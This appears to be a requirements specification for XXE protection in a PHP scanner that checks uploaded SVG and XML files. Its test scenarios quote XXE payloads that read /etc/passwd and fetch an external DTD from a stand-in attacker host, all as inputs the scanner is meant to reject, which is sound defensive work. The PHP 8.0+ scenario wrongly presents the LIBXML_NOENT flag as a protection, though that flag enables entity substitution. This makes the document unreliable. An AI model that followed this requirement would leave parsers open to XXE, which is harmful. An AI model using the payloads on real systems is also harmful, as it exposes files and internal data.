# XXE Protection

## ADDED Requirements

### Requirement: XXE Attack Prevention

The system SHALL prevent XML External Entity (XXE) attacks when parsing SVG and XML files by disabling external entity loading before any XML parsing operations.

#### Scenario: Malicious XXE payload is blocked
- **WHEN** an SVG file contains an XXE payload like `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- **THEN** the scanner SHALL reject the file
- **AND** the scanner SHALL report "XXE attack detected: external entity declaration"

#### Scenario: System entity reference is blocked
- **WHEN** an SVG file contains `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- **AND** the entity is referenced as `&xxe;`
- **THEN** the scanner SHALL reject the file without reading the system file

#### Scenario: Parameter entity is blocked
- **WHEN** an SVG file contains `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">`
- **THEN** the scanner SHALL reject the file
- **AND** no external HTTP request SHALL be made

#### Scenario: Billion laughs attack is prevented
- **WHEN** an SVG file contains recursive entity definitions (billion laughs/exponential entity expansion)
- **THEN** the scanner SHALL reject the file
- **AND** memory consumption SHALL remain bounded

#### Scenario: Valid SVG without entities passes
- **WHEN** an SVG file contains no DTD declarations or entity references
- **AND** the file contains only valid SVG elements
- **THEN** the scanner SHALL process the file normally

### Requirement: DTD Declaration Detection

The system SHALL detect and block DOCTYPE declarations with entity definitions in uploaded files.

#### Scenario: DOCTYPE with external subset is blocked
- **WHEN** an SVG file contains `<!DOCTYPE svg SYSTEM "http://attacker.com/evil.dtd">`
- **THEN** the scanner SHALL reject the file
- **AND** report "External DTD reference detected"

#### Scenario: DOCTYPE with internal entity subset is blocked
- **WHEN** an SVG file contains `<!DOCTYPE svg [<!ENTITY ...>]>`
- **THEN** the scanner SHALL reject the file
- **AND** report "DTD entity declaration detected"

#### Scenario: Simple DOCTYPE without entities is allowed
- **WHEN** an SVG file contains `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">`
- **AND** no entity declarations are present in the file content
- **THEN** the scanner MAY allow the file (configurable)

### Requirement: PHP Version Compatibility

The system SHALL implement XXE protection compatible with both PHP 7.x and PHP 8.x environments.

#### Scenario: PHP 7.x environment
- **WHEN** running on PHP 7.x
- **THEN** the system SHALL use `libxml_disable_entity_loader(true)` before parsing

#### Scenario: PHP 8.0+ environment
- **WHEN** running on PHP 8.0 or later
- **THEN** the system SHALL use `LIBXML_NOENT` flag with DOMDocument
- **AND** SHALL use `libxml_use_internal_errors(true)` for error handling
